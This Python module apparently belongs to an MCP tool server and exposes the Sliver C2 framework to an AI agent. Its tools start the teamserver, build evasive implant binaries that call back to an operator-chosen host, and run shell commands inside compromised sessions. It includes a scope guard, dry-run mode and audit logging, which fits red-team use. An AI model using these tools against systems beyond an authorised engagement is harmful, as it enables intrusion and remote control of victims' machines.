"""Sliver C2 tools.

Sliver exposes its operator-side API via gRPC over mTLS using an operator
config file exported from ``sliver-server``. Ideally we would use the
``sliver-py`` SDK, but for portability we drive the official
``sliver-client`` binary in one-shot mode (``--command "..."``) and parse
its stdout.

This keeps the attack surface small: no long-lived TLS keys in memory,
and any failure is trivially reproducible from a shell.

Tools:
    * ``sliver_start_server``        start the teamserver in the background
    * ``sliver_stop_server``         stop the teamserver
    * ``sliver_server_status``       server running? (PID-file check)
    * ``sliver_run_command``         run a single operator command, return stdout
    * ``sliver_list_sessions``       structured alias for `sessions`
    * ``sliver_list_listeners``      structured alias for `jobs`
    * ``sliver_generate_implant``    build an implant binary
    * ``sliver_execute_in_session``  run a shell/implant command inside a session
"""

from __future__ import annotations

import os
import re
import signal
import subprocess
import sys
from pathlib import Path
from typing import Any

from ..config import Settings
from ..executor import ExecutorError, resolve_binary, run_command
from ..logging import audit_event
from ..security import ScopeGuard
from .base import ToolModule, ToolResult, ToolSpec


_SERVER_PID_FILE = "sliver-server.pid"


class SliverModule(ToolModule):
    id = "sliver"

    def __init__(self, settings: Settings, scope_guard: ScopeGuard) -> None:
        super().__init__(settings, scope_guard)
        block = self.settings.tools.sliver
        self._server_hint: str | None = getattr(block, "server_binary", None) or getattr(
            block, "binary", None
        )
        self._client_hint: str | None = getattr(block, "client_binary", None)
        self._operator_config: str | None = getattr(block, "operator_config", None)
        runs_dir = settings.expanded_path(settings.execution.working_dir)
        runs_dir.mkdir(parents=True, exist_ok=True)
        self._pid_file = runs_dir / _SERVER_PID_FILE

    def _server_binary(self) -> str:
        return resolve_binary(self._server_hint, "sliver-server")

    def _client_binary(self) -> str:
        return resolve_binary(self._client_hint, "sliver-client")

    def specs(self) -> list[ToolSpec]:
        return [
            ToolSpec(
                name="sliver_start_server",
                description=(
                    "Start sliver-server in the background. It will run unattended and "
                    "persist its state in ~/.sliver/. First-time startup initialises "
                    "certificates and can take ~30s."
                ),
                input_schema={
                    "type": "object",
                    "properties": {
                        "daemon": {
                            "type": "boolean",
                            "default": True,
                            "description": "Run as daemon (vs attached TTY).",
                        },
                    },
                    "additionalProperties": False,
                },
                handler=self._handle_start_server,
                dangerous=True,
                tags=["c2"],
            ),
            ToolSpec(
                name="sliver_stop_server",
                description="Stop the sliver-server process started by this MCP.",
                input_schema={"type": "object", "properties": {}, "additionalProperties": False},
                handler=self._handle_stop_server,
                tags=["c2"],
            ),
            ToolSpec(
                name="sliver_server_status",
                description="Return whether sliver-server is running (PID-file based).",
                input_schema={"type": "object", "properties": {}, "additionalProperties": False},
                handler=self._handle_server_status,
                tags=["c2", "meta"],
            ),
            ToolSpec(
                name="sliver_run_command",
                description=(
                    "Execute ONE raw sliver-client command and return stdout. "
                    "Useful for commands not covered by dedicated tools. "
                    "Example: 'implants', 'sessions', 'jobs', 'canaries'."
                ),
                input_schema={
                    "type": "object",
                    "required": ["command"],
                    "properties": {
                        "command": {
                            "type": "string",
                            "description": "The sliver operator command line.",
                        },
                        "timeout_sec": {
                            "type": "integer",
                            "minimum": 5,
                            "maximum": 1800,
                        },
                    },
                    "additionalProperties": False,
                },
                handler=self._handle_run_command,
                dangerous=True,
                tags=["c2", "power-user"],
            ),
            ToolSpec(
                name="sliver_list_sessions",
                description="List active sliver sessions (parsed into a structured list).",
                input_schema={"type": "object", "properties": {}, "additionalProperties": False},
                handler=self._handle_list_sessions,
                tags=["c2", "recon"],
            ),
            ToolSpec(
                name="sliver_list_listeners",
                description="List active C2 listeners / jobs (HTTP, HTTPS, mTLS, DNS, WG).",
                input_schema={"type": "object", "properties": {}, "additionalProperties": False},
                handler=self._handle_list_jobs,
                tags=["c2", "recon"],
            ),
            ToolSpec(
                name="sliver_generate_implant",
                description=(
                    "Generate an implant binary. The operator supplies the callback "
                    "(mTLS, HTTPS, HTTP, DNS) and target OS/arch. The output file is "
                    "written to the working directory by default."
                ),
                input_schema={
                    "type": "object",
                    "required": ["callback_addr", "protocol"],
                    "properties": {
                        "protocol": {
                            "type": "string",
                            "enum": ["mtls", "https", "http", "dns", "wg"],
                        },
                        "callback_addr": {
                            "type": "string",
                            "description": "e.g. 'example.com:443' or 'c2.domain.tld'.",
                        },
                        "os": {
                            "type": "string",
                            "enum": ["windows", "linux", "darwin"],
                            "default": "windows",
                        },
                        "arch": {
                            "type": "string",
                            "enum": ["amd64", "386", "arm64"],
                            "default": "amd64",
                        },
                        "format": {
                            "type": "string",
                            "enum": ["exe", "shellcode", "shared", "service"],
                            "default": "exe",
                        },
                        "beacon": {
                            "type": "boolean",
                            "default": False,
                            "description": "Build beacon implant (async check-in).",
                        },
                        "beacon_interval_sec": {
                            "type": "integer",
                            "minimum": 10,
                            "default": 60,
                        },
                        "beacon_jitter_pct": {
                            "type": "integer",
                            "minimum": 0,
                            "maximum": 100,
                            "default": 30,
                        },
                        "evasion": {"type": "boolean", "default": False},
                        "skip_symbols": {"type": "boolean", "default": True},
                        "save_dir": {"type": "string"},
                    },
                    "additionalProperties": False,
                },
                handler=self._handle_generate,
                dangerous=True,
                requires_scope_field="callback_addr",
                tags=["c2", "payload"],
            ),
            ToolSpec(
                name="sliver_execute_in_session",
                description=(
                    "Run a command inside a given sliver session and return stdout."
                ),
                input_schema={
                    "type": "object",
                    "required": ["session_id", "command"],
                    "properties": {
                        "session_id": {
                            "type": "string",
                            "description": "Session ID as shown by sliver_list_sessions.",
                        },
                        "command": {
                            "type": "string",
                            "description": (
                                "Sliver command to run after `use <session>`. "
                                "e.g. 'execute -o cmd.exe /c whoami', 'shell', 'ps'."
                            ),
                        },
                        "timeout_sec": {
                            "type": "integer",
                            "minimum": 5,
                            "maximum": 1800,
                        },
                    },
                    "additionalProperties": False,
                },
                handler=self._handle_execute_in_session,
                dangerous=True,
                tags=["c2", "post-ex"],
            ),
        ]

    # ------------------------------------------------------------------ server

    async def _handle_start_server(self, arguments: dict[str, Any]) -> ToolResult:
        if self._pid_file.exists():
            try:
                pid = int(self._pid_file.read_text("utf-8").strip())
                if _alive(pid):
                    return ToolResult.error(f"sliver-server already running PID {pid}.")
            except (ValueError, OSError):
                pass

        binary = self._server_binary()
        daemon = bool(arguments.get("daemon", True))
        argv: list[str] = [binary]
        if daemon:
            argv.append("daemon")

        if self.settings.security.dry_run:
            return ToolResult(
                text=f"[dry-run] would start: {' '.join(argv)}",
                structured={"dry_run": True, "argv": argv},
            )

        log_path = self._pid_file.with_suffix(".log")
        try:
            log_fh = log_path.open("ab")
            proc = subprocess.Popen(  # noqa: S603
                argv,
                stdout=log_fh,
                stderr=log_fh,
                stdin=subprocess.DEVNULL,
                cwd=str(Path(binary).parent),
                creationflags=(
                    subprocess.CREATE_NEW_PROCESS_GROUP if sys.platform == "win32" else 0
                ),
            )
        except OSError as exc:
            return ToolResult.error(f"Failed to spawn sliver-server: {exc}")

        self._pid_file.write_text(str(proc.pid), encoding="utf-8")
        audit_event(self.log, "sliver.server.start", pid=proc.pid)
        return ToolResult(
            text=f"sliver-server started, PID {proc.pid}. Logs: {log_path}",
            structured={"pid": proc.pid, "log_path": str(log_path)},
        )

    async def _handle_stop_server(self, _arguments: dict[str, Any]) -> ToolResult:
        if not self._pid_file.exists():
            return ToolResult(text="sliver-server is not running.", structured={"running": False})
        try:
            pid = int(self._pid_file.read_text("utf-8").strip())
        except ValueError:
            self._pid_file.unlink(missing_ok=True)
            return ToolResult.error("PID file malformed, cleaned up.")
        if not _alive(pid):
            self._pid_file.unlink(missing_ok=True)
            return ToolResult(text=f"PID {pid} already exited.", structured={"running": False})
        try:
            if sys.platform == "win32":
                os.kill(pid, signal.CTRL_BREAK_EVENT)
            else:
                os.kill(pid, signal.SIGTERM)
        except OSError as exc:
            return ToolResult.error(f"Failed to stop PID {pid}: {exc}")
        self._pid_file.unlink(missing_ok=True)
        audit_event(self.log, "sliver.server.stop", pid=pid)
        return ToolResult(text=f"Stopped sliver-server PID {pid}.", structured={"stopped_pid": pid})

    async def _handle_server_status(self, _arguments: dict[str, Any]) -> ToolResult:
        if not self._pid_file.exists():
            return ToolResult(text="not running", structured={"running": False})
        try:
            pid = int(self._pid_file.read_text("utf-8").strip())
        except ValueError:
            return ToolResult.error("PID file corrupt")
        running = _alive(pid)
        if not running:
            self._pid_file.unlink(missing_ok=True)
        return ToolResult(text=f"pid={pid} running={running}", structured={"pid": pid, "running": running})

    # ------------------------------------------------------------------ client

    async def _run_client(self, command: str, timeout_sec: int | None = None) -> ToolResult:
        try:
            binary = self._client_binary()
        except ExecutorError as exc:
            return ToolResult.error(str(exc))

        argv = [binary, "--command", command]
        if self._operator_config:
            argv += ["--config", self._operator_config]

        timeout = int(timeout_sec or self.settings.execution.timeout_sec)
        if self.settings.security.dry_run:
            return ToolResult(
                text=f"[dry-run] would run: {' '.join(argv)}",
                structured={"dry_run": True, "argv": argv},
            )

        result = await run_command(
            argv,
            timeout_sec=timeout,
            max_output_bytes=self.settings.execution.max_output_bytes,
        )
        return ToolResult(
            text=(
                f"sliver '{command[:60]}{'…' if len(command) > 60 else ''}' "
                f"-> exit={result.exit_code} dur={result.duration_sec:.1f}s"
            ),
            structured={
                "command": command,
                "exit_code": result.exit_code,
                "stdout": result.stdout,
                "stderr_tail": result.stderr[-2000:],
                "duration_sec": result.duration_sec,
                "truncated": result.truncated,
            },
            is_error=not result.ok,
        )

    async def _handle_run_command(self, arguments: dict[str, Any]) -> ToolResult:
        command = arguments["command"]
        audit_event(self.log, "sliver.run_command", command=command[:200])
        return await self._run_client(command, timeout_sec=arguments.get("timeout_sec"))

    async def _handle_list_sessions(self, _arguments: dict[str, Any]) -> ToolResult:
        result = await self._run_client("sessions")
        if result.is_error:
            return result
        stdout = (result.structured or {}).get("stdout", "")
        sessions = _parse_table(stdout)
        audit_event(self.log, "sliver.sessions", count=len(sessions))
        return ToolResult(
            text=f"{len(sessions)} active session(s).",
            structured={"count": len(sessions), "sessions": sessions, "raw": stdout[-4000:]},
        )

    async def _handle_list_jobs(self, _arguments: dict[str, Any]) -> ToolResult:
        result = await self._run_client("jobs")
        if result.is_error:
            return result
        stdout = (result.structured or {}).get("stdout", "")
        jobs = _parse_table(stdout)
        return ToolResult(
            text=f"{len(jobs)} active listener/job(s).",
            structured={"count": len(jobs), "jobs": jobs, "raw": stdout[-4000:]},
        )

    async def _handle_generate(self, arguments: dict[str, Any]) -> ToolResult:
        callback = arguments["callback_addr"]
        protocol = arguments["protocol"]
        self.scope_guard.ensure(callback, tool_name="sliver_generate_implant")

        os_name = arguments.get("os", "windows")
        arch = arguments.get("arch", "amd64")
        fmt = arguments.get("format", "exe")
        beacon = bool(arguments.get("beacon"))
        save_dir = arguments.get("save_dir")

        cmd_parts = ["generate"]
        if beacon:
            cmd_parts.append("beacon")
        cmd_parts += [f"--{protocol}", callback]
        cmd_parts += ["--os", os_name, "--arch", arch, "--format", fmt]
        if beacon:
            cmd_parts += ["--seconds", str(int(arguments.get("beacon_interval_sec", 60)))]
            cmd_parts += ["--jitter", str(int(arguments.get("beacon_jitter_pct", 30)))]
        if arguments.get("evasion"):
            cmd_parts.append("--evasion")
        if arguments.get("skip_symbols", True):
            cmd_parts.append("--skip-symbols")
        if save_dir:
            cmd_parts += ["--save", save_dir]

        command = " ".join(cmd_parts)
        audit_event(
            self.log,
            "sliver.generate",
            protocol=protocol,
            callback=callback,
            os=os_name,
            arch=arch,
            format=fmt,
            beacon=beacon,
        )
        return await self._run_client(command, timeout_sec=arguments.get("timeout_sec", 900))

    async def _handle_execute_in_session(self, arguments: dict[str, Any]) -> ToolResult:
        session_id = arguments["session_id"]
        command = arguments["command"]
        if not re.match(r"^[A-Za-z0-9_-]{1,64}$", session_id):
            return ToolResult.error(f"Illegal session id: {session_id!r}")
        composite = f"use {session_id}; {command}"
        audit_event(self.log, "sliver.exec_in_session", session=session_id, command=command[:200])
        return await self._run_client(composite, timeout_sec=arguments.get("timeout_sec"))


def _alive(pid: int) -> bool:
    if sys.platform == "win32":
        try:
            output = subprocess.check_output(  # noqa: S603,S607
                ["tasklist", "/FI", f"PID eq {pid}", "/FO", "CSV", "/NH"],
                text=True,
                stderr=subprocess.DEVNULL,
            )
            return str(pid) in output
        except (OSError, subprocess.SubprocessError):
            return False
    try:
        os.kill(pid, 0)
        return True
    except OSError:
        return False


def _parse_table(output: str) -> list[dict[str, str]]:
    """Best-effort parse of the ASCII table sliver-client prints.

    Uses the first '====' or blank-bordered line as the column separator;
    falls back to splitting on two+ spaces. Returns [] if the output
    doesn't look tabular.
    """

    lines = [ln for ln in output.splitlines() if ln.strip()]
    if not lines:
        return []

    header_idx = -1
    for i, line in enumerate(lines):
        if re.match(r"^[=]{3,}", line) or re.match(r"^\s*[A-Z][A-Z ]+\s{2,}", line):
            header_idx = i
            break
    if header_idx == -1:
        return []

    header = lines[header_idx]
    rows = lines[header_idx + 1 :]

    col_positions: list[int] = []
    for m in re.finditer(r"\S+(?:\s\S+)*", header):
        col_positions.append(m.start())
    if not col_positions:
        return []
    columns = [header[s:e].strip() for s, e in _pairs(col_positions, len(header))]

    parsed: list[dict[str, str]] = []
    for row in rows:
        if re.match(r"^[=-]{3,}", row):
            continue
        values = [row[s:e].strip() for s, e in _pairs(col_positions, len(row))]
        if len(values) != len(columns):
            parts = re.split(r"\s{2,}", row.strip())
            if len(parts) == len(columns):
                values = parts
            else:
                continue
        parsed.append(dict(zip(columns, values)))
    return parsed


def _pairs(starts: list[int], line_len: int) -> list[tuple[int, int]]:
    pairs: list[tuple[int, int]] = []
    for i, s in enumerate(starts):
        e = starts[i + 1] if i + 1 < len(starts) else line_len
        pairs.append((s, e))
    return pairs
